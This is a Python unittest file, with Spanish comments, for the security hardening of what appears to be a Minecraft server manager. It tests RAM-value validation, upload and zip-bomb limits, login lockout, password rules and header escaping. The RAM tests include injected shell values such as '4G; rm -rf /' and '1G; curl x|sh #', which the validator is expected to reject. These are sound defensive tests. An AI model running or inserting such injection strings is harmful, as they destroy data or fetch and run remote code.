"""Revisión de seguridad de la 2.0: RAM, subidas, login, contraseñas, permisos y cabeceras."""
import io
import os
import shutil
import stat
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock

import bcrypt
from fastapi import HTTPException

from routes import auth
from routes.deps import attachment_headers
from services import secure_files, uploads, users
from services.server_create import _write_run_script
from services.utils import check_ram_values, configure_jvm_ram


class RamValidationTest(unittest.TestCase):
    def test_valid_values(self):
        for value in ["4G", "2500M", "1g", "512m"]:
            with self.subTest(value=value):
                check_ram_values(value, value)

    def test_rejects_shell_injection_and_junk(self):
        bad = ["", "4", "4GB", "0G", "1.5G", "4G; rm -rf /", "4G\nreboot", "$(id)G", "4G #", " 4G", "99999999G"]
        for value in bad:
            with self.subTest(value=value), self.assertRaises(ValueError):
                check_ram_values(value, "4G")

    def test_run_script_never_written_with_bad_ram(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            with self.assertRaises(ValueError):
                _write_run_script(tmp, "server.jar", "1G; curl x|sh #", "4G")
            self.assertFalse((tmp / "run.sh").exists())
            _write_run_script(tmp, "server.jar", "2G", "4G")
            self.assertIn("-Xms2G -Xmx4G", (tmp / "run.sh").read_text())
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_configure_jvm_ram_validates_too(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            (tmp / "user_jvm_args.txt").write_text("-Xmx4G\n")
            with self.assertRaises(ValueError):
                configure_jvm_ram(tmp, "1G -XX:OnOutOfMemoryError=sh", "4G")
            self.assertEqual((tmp / "user_jvm_args.txt").read_text(), "-Xmx4G\n")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class UploadLimitTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_copy_limited_cuts_at_limit(self):
        out = io.BytesIO()
        self.assertEqual(uploads.copy_limited(io.BytesIO(b"x" * 100), out, 100), 100)
        with self.assertRaises(HTTPException) as ctx:
            uploads.copy_limited(io.BytesIO(b"x" * 101), io.BytesIO(), 100)
        self.assertEqual(ctx.exception.status_code, 413)

    def test_zip_bomb_rejected_before_extracting(self):
        archive = self.tmp / "bomb.zip"
        with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("big.bin", b"\0" * (3 * 1024 * 1024))
        self.assertLess(archive.stat().st_size, 100 * 1024)
        with mock.patch.object(uploads, "MAX_EXTRACTED_MB", 1):
            with self.assertRaises(HTTPException) as ctx:
                uploads.check_extracted_size(archive, self.tmp / "dest")
        self.assertEqual(ctx.exception.status_code, 413)
        self.assertFalse((self.tmp / "dest").exists())

    def test_normal_zip_passes(self):
        archive = self.tmp / "ok.zip"
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr("a.txt", b"hola")
        uploads.check_extracted_size(archive, self.tmp / "dest")


class LoginLockoutTest(unittest.TestCase):
    def setUp(self):
        auth._failed_attempts.clear()

    def tearDown(self):
        auth._failed_attempts.clear()

    def _request(self, ip="10.0.0.9"):
        return mock.Mock(client=mock.Mock(host=ip))

    def test_per_ip_lockout_across_usernames(self):
        request = self._request()
        for i in range(auth.LOGIN_MAX_FAILED_ATTEMPTS_PER_IP):
            for key, _ in auth._login_attempt_keys(request, f"user{i}"):
                auth._register_failed_attempt(key)
        # Ningún usuario llegó a 5 fallos, pero la IP sí a su máximo.
        keys = auth._login_attempt_keys(request, "otro")
        self.assertIsNone(auth._seconds_locked_out(keys[0][0], keys[0][1]))
        self.assertIsNotNone(auth._seconds_locked_out(keys[1][0], keys[1][1]))
        # Otra IP no queda afectada.
        other = auth._login_attempt_keys(self._request("10.0.0.10"), "otro")
        self.assertIsNone(auth._seconds_locked_out(other[1][0], other[1][1]))

    def test_dict_is_bounded(self):
        with mock.patch.object(auth, "_MAX_TRACKED_KEYS", 50):
            for i in range(200):
                auth._register_failed_attempt(f"k{i}")
            self.assertLessEqual(len(auth._failed_attempts), 50)


class UsersTest(unittest.TestCase):
    """Con .env y users.json temporales: nunca los de verdad del repo."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.env = self.tmp / ".env"
        self.env.write_text("APP_USERNAME=jefe\nAPP_PASSWORD_HASH=x\n")
        self.users_path = self.tmp / "users.json"
        self.users_path.write_text("[]")
        admin_hash = bcrypt.hashpw(b"admin-pass-1", bcrypt.gensalt(4)).decode()
        self.patches = [
            mock.patch.object(users, "_ENV_PATH", self.env),
            mock.patch.object(users, "_USERS_PATH", self.users_path),
            mock.patch.dict(os.environ, {"APP_USERNAME": "jefe", "APP_PASSWORD_HASH": admin_hash}),
        ]
        for p in self.patches:
            p.start()

    def tearDown(self):
        for p in reversed(self.patches):
            p.stop()
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_unknown_user_still_runs_bcrypt(self):
        with mock.patch.object(users.bcrypt, "checkpw", wraps=users.bcrypt.checkpw) as spy:
            self.assertIsNone(users.authenticate("nadie", "loquesea"))
        spy.assert_called_once()

    def test_change_user_password_revokes_sessions(self):
        users.create_user("ana", "primera-pass")
        before = users.password_fingerprint("ana")
        users.set_password("ana", "segunda-pass")
        self.assertIsNone(users.authenticate("ana", "primera-pass"))
        self.assertEqual(users.authenticate("ana", "segunda-pass"), "user")
        self.assertNotEqual(before, users.password_fingerprint("ana"))

    def test_change_admin_password_applies_immediately(self):
        users.set_password("jefe", "nueva-admin-pass")
        self.assertEqual(users.authenticate("jefe", "nueva-admin-pass"), "admin")
        self.assertIsNone(users.authenticate("jefe", "admin-pass-1"))
        self.assertIn("APP_PASSWORD_HASH=$2", self.env.read_text())

    def test_password_rules(self):
        for bad in ["corta", "con emoji 😀😀", "x" * 73]:
            with self.subTest(bad=bad[:10]), self.assertRaises(ValueError):
                users.validate_password(bad)
        with self.assertRaises(KeyError):
            users.set_password("fantasma", "valida-pass")

    @unittest.skipUnless(os.name == "posix", "los permisos 600 solo existen en POSIX")
    def test_users_json_is_private(self):
        users.create_user("ana", "primera-pass")
        self.assertEqual(stat.S_IMODE(self.users_path.stat().st_mode), 0o600)


class SecureFilesTest(unittest.TestCase):
    def test_atomic_write_keeps_old_content_on_failure(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            target = tmp / "server.properties"
            target.write_text("motd=antes\n")

            with mock.patch.object(secure_files.os, "replace", side_effect=OSError("disco lleno")):
                with self.assertRaises(OSError):
                    secure_files.atomic_write_text(target, "motd=despues\n")
            self.assertEqual(target.read_text(), "motd=antes\n")
            self.assertEqual([p.name for p in tmp.iterdir()], ["server.properties"])
            secure_files.atomic_write_text(target, "motd=despues\n")
            self.assertEqual(target.read_text(), "motd=despues\n")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class AttachmentHeaderTest(unittest.TestCase):
    def test_quotes_and_accents_are_safe(self):
        header = attachment_headers('mi "mundo"; ñ.zip')["Content-Disposition"]
        ascii_part = header.split("; filename*=")[0]
        self.assertEqual(ascii_part, 'attachment; filename="mi _mundo__ _.zip"')
        self.assertIn("filename*=UTF-8''mi%20%22mundo%22%3B%20%C3%B1.zip", header)
